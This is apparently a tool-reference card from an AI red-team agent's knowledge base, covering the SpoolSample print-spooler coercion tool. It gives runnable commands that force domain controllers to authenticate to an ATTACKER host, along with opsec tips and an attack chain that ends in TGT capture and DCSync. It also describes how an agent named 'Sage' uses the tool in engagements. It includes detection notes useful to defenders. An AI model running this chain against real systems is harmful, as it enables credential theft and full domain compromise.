---
name: SpoolSample
category: coercion-relay
subcategories: [authentication-coercion, ms-rprn, print-spooler]
tradecraft_tags: [coercion, print-spooler, ms-rprn, printerbug, ntlm-relay]
mitre_attack:
  - id: T1187
    name: Forced Authentication
source:
  url: https://github.com/leechristensen/SpoolSample
  license: Unknown
  maintained: false
binary_type: .net-assembly
binary_filename: SpoolSample.exe
supported_os: [windows]
architecture: [x64, x86]
privilege_required: domain-user
network_required: true
detection_signal: |
  MS-RPRN RpcRemoteFindFirstPrinterChangeNotification calls from non-admin contexts
  are unusual and detectable by IDS/network monitoring. Print Spooler service must be
  running on the target. Disabling the Print Spooler (now recommended by Microsoft for
  DCs) blocks this entirely. Sysmon event 3 for outbound connections from spoolsv.exe.
usage_examples:
  - description: Coerce DC to authenticate to attacker machine
    args: "SpoolSample.exe DC01.north.sevenkingdoms.local ATTACKER.north.sevenkingdoms.local"
  - description: Coerce any machine with Print Spooler enabled
    args: "SpoolSample.exe WINTERFELL.north.sevenkingdoms.local ATTACKER.north.sevenkingdoms.local"
opsec_notes: |
  SpoolSample is a .NET assembly (unlike PetitPotam which is Python) — runnable directly
  from Apollo via inline_assembly. The target must have the Print Spooler service running
  and accessible (most DCs had this historically; many are now hardened). The coerced auth
  comes from the machine account (TARGET$) — useful for unconstrained delegation capture
  or NTLM relay to LDAP. Microsoft now recommends disabling Print Spooler on DCs; verify
  it's running before attempting.
gotchas: |
  The Print Spooler service (spoolsv.exe) must be running on the target. On fully
  hardened DCs (post-PrintNightmare guidance), spoolsv.exe may be disabled. Check
  service status first. SpoolSample takes FQDNs, not IP addresses — ensure DNS resolution
  works. The coerced auth goes from the target's machine account$ to the attacker
  machine specified (it must be reachable from the target and listening for SMB/Kerberos).
  Prefer Coercer for multi-protocol fallback when SpoolSample fails.
related_ttps: [coercer, petitpotam, dfscoerce, shadowcoerce, krbrelay]
alternatives: [coercer, printerbug, dfscoerce]
common_args:
  target:
    description: Machine to coerce (FQDN required; must have Print Spooler running)
    typical_values: ["DC01.north.sevenkingdoms.local", "WINTERFELL.north.sevenkingdoms.local"]
    required: true
  listener:
    description: Attacker's machine FQDN or IP to receive the coerced authentication
    typical_values: ["ATTACKER.north.sevenkingdoms.local", "192.168.56.100"]
    required: true
last_updated: 2026-05-29
---

# SpoolSample

The original "PrinterBug" PoC by Lee Christensen (@tifkin_). SpoolSample abuses the
MS-RPRN `RpcRemoteFindFirstPrinterChangeNotification` function to force a target machine
to authenticate to an attacker-controlled host via SMB/Kerberos. As a .NET assembly,
SpoolSample is directly runnable via Apollo's inline_assembly — no Python infrastructure
needed. The machine account's authentication can be relayed or captured for unconstrained
delegation abuse.

## Typical use cases
- Coerce DC machine account authentication for unconstrained delegation ticket capture
- Force member server auth for NTLM relay chains
- Trigger authentication for Kerberos relay (relay to LDAP for RBCD)

## How Sage uses this
SpoolSample is preferred over PetitPotam for Apollo engagements because it's a .NET
assembly runnable directly via inline_assembly. The typical unconstrained-delegation
chain: run SpoolSample from a machine with unconstrained delegation → the DC$ authenticates
→ Rubeus monitor captures the TGT → inject and use for DCSync rights.

## Output
Text output confirming the spooler call was made. The actual effect (authentication
event) is visible on the relay listener or Rubeus monitor.
